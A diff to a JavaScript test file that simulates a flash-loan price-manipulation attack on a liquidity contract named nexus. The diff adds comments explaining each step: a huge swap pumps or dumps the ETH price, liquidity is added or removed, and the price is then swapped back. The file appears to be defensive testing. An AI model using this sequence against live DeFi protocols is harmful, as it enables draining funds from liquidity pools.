@@ -29,12 +29,12 @@ describe("flashloan exploit simulation", () => {
 
     const investUSDC = bn6("500,000,000");
 
-    const amountToReturnETH = await pumpPriceETH(investUSDC);
+    const amountToReturnETH = await pumpPriceETH(investUSDC); // extreme pump ETH price by doing a huge swap
 
     const available = bn(await nexus.methods.availableSpaceToDepositETH().call());
     await nexus.methods.addLiquidityETH(usdcWhale, deadline).send({ value: available, from: usdcWhale });
 
-    await dumpPriceETH(amountToReturnETH);
+    await dumpPriceETH(amountToReturnETH); // bring ETH price back to normal by swapping back
 
     await nexus.methods.removeAllLiquidityETH(usdcWhale, deadline).send({ from: usdcWhale });
 
@@ -82,11 +82,11 @@ describe("flashloan exploit simulation", () => {
     const investETH = bn18("300,000");
     const totalInvestETH = available.add(investETH);
 
-    const amountToReturnUSDC = await dumpPriceETH(investETH);
+    const amountToReturnUSDC = await dumpPriceETH(investETH); // extreme dump ETH price by doing a huge swap
 
     await nexus.methods.removeAllLiquidityETH(usdcWhale, deadline).send({ from: usdcWhale });
 
-    await pumpPriceETH(amountToReturnUSDC);
+    await pumpPriceETH(amountToReturnUSDC); // bring ETH price back to normal by swapping back
 
     console.log("exploit on exit results:");
     console.log("total invested ETH", fmt18(totalInvestETH));
